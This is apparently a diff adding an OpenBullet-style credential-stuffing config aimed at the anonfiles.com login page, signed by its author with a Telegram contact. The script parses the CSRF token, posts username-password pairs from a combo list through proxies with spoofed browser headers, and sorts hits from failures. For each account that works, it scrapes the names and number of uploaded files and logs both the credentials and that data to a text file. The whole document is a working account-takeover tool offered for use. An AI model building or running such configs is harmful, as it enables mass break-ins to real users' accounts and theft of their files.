@@ -1,0 +1,104 @@
+[SETTINGS]
+{
+  "Name": "AnonFiles.Com",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2020-06-18T23:00:08.723487+02:00",
+  "AdditionalInfo": "T.me/ @BruteForce | Capture Name uploaded files & Number files | CPM: 500_2000",
+  "Author": "@H0S31N",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://anonfiles.com/login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Token PARSE "<SOURCE>" LR "name=\"_token\" value=\"" "\">" -> VAR "Token" 
+
+#Lenght FUNCTION Length "username=<USER>&password=<PASS>&_token=<Token>" -> VAR "Lenght" 
+
+#Post REQUEST POST "https://anonfiles.com/login" 
+  CONTENT "username=<USER>&password=<PASS>&_token=<Token>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER ": scheme: https" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: fa,en-US;q=0.9,en;q=0.8" 
+  HEADER "cache-control: max-age=0" 
+  HEADER "content-length: <Lenght>" 
+  HEADER "origin: https://anonfiles.com" 
+  HEADER "referer: https://anonfiles.com/login" 
+  HEADER "sec-fetch-dest: document" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Invalid username or password." 
+  KEYCHAIN Success OR 
+    KEY "logout" 
+
+#KIR1 PARSE "<SOURCE>" LR "<i class=\"glyphicon glyphicon-search\"></i>" "<a hreflang=\"en\" href=\"https://anonfiles.com/us\"><img" -> VAR "KIR1" 
+
+#KIR2 PARSE "<SOURCE>" LR "class=\"text-wordwrap\">" "</span>" Recursive=TRUE -> VAR "KIR2" 
+
+#Files_Name FUNCTION Replace "," " / " "<KIR2>" -> CAP "Files Name" 
+
+#Numbe FUNCTION CountOccurrences " / " "<Files Name>" -> VAR "Numbe" 
+
+#Number FUNCTION Compute "<Numbe>+1" -> CAP "Number" 
+
+#KIR3 FUNCTION Replace "[" "" "<Files Name>" -> VAR "KIR3" 
+
+#KIR4 FUNCTION Replace "]" "" "<KIR3>" -> VAR "KIR4" 
+
+#KIR5 FUNCTION Replace " / " "\\n" "<KIR4>" -> VAR "KIR5" 
+
+#SS UTILITY File "AnonFile.txt" AppendLines "<<<<Account>>>>\\nCombo: <USER>:<PASS>\\nUser: <USER>\\nPass: <PASS>\\n<<<<Capture>>>>\\nFiles Name:\\nNumber: <Number>\\n <KIR5>\\n===================================" -> VAR "SS" 
+
